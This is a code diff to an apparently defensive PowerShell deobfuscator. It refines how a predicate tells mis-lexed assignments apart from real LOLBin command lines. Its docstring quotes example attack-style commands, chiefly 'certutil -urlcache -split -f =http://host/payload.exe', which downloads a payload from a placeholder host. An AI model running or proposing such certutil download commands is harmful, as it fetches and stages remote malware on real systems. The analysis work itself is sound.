@@ -58,19 +58,25 @@ def _carries_assignment_marker(cmd: Ps1CommandInvocation, name: str) -> bool:
     `foo =5` becomes a name and one `=`-prefixed argument, while `0042DsKaho=8602057` stays a single
     bareword name, the digit-leading form being the one an obfuscator emits most.
 
-    The split spelling is recognized only when that argument is the *whole* argument list, because
-    that is what a two-token assignment leaves behind. A real invocation carrying one `=`-prefixed
-    token among several — `certutil -urlcache -split -f =http://host/payload.exe`, `findstr = log` —
-    is a command line, not a mis-lexed assignment, and matching it here erases the very
-    `try { <LOLBin> } catch { }` shape this predicate was rewritten to stop erasing.
+    The split spelling is recognized only when the residue is *everything* the invocation carries:
+    one argument, written without quotes, reached without a call operator. Each of those is a thing
+    an assignment cannot produce and a command line can — `certutil -urlcache -split -f
+    =http://host/payload.exe` carries three more tokens, `certutil '=http://host/payload.exe'`
+    quotes the one it has, and `& msiexec =foo` is in command position by an operator that is legal
+    nowhere else — and matching any of them erases the very `try { <LOLBin> } catch { }` shape this
+    predicate was rewritten to stop erasing.
     """
     if '=' in name:
         return True
-    if len(cmd.arguments) != 1:
+    if cmd.invocation_operator or len(cmd.arguments) != 1:
         return False
     argument = cmd.arguments[0]
     value = argument.value if isinstance(argument, Ps1CommandArgument) else argument
-    return isinstance(value, Ps1StringLiteral) and value.value.startswith('=')
+    return (
+        isinstance(value, Ps1StringLiteral)
+        and value.raw == value.value
+        and value.value.startswith('=')
+    )
 
 
 def _is_injected_noise_bareword(expr: Expression, oracle: TypeOracle) -> bool:
